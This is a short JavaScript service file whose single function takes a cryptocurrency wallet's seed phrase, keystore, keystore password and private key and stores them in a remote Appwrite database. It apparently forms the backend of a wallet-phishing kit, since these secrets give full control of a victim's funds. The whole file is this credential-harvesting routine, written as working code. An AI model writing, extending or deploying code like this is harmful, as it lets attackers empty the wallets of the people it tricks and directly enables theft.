// src/services/appwriteService.js
import { databases, DATABASE_ID, COLLECTION_ID } from "../lib/appwrite";
import { ID } from "appwrite";

export const saveCredentials = async (credentials) => {
  try {
    // Prepare the data to match your Appwrite collection columns
    const data = {
      phrase: credentials.seedPhrase || "",
      keystore: credentials.keystore || "",
      keystorePassword: credentials.keystorePassword || "",
      privateKey: credentials.privateKey || "",
    };

    const response = await databases.createDocument(
      DATABASE_ID,
      COLLECTION_ID,
      ID.unique(),
      data
    );

    console.log("✅ Credentials saved to Appwrite:", response);
    return { success: true, data: response };
  } catch (error) {
    console.error("❌ Appwrite error:", error);
    
    let errorMessage = error.message;
    if (error.code === 401) {
      errorMessage = "Authentication failed. Please check your Appwrite permissions.";
    } else if (error.code === 403) {
      errorMessage = "You don't have permission to write to this collection.";
    } else if (error.code === 404) {
      errorMessage = "Database or collection not found. Please check your IDs.";
    }
    
    return { success: false, error: errorMessage };
  }
};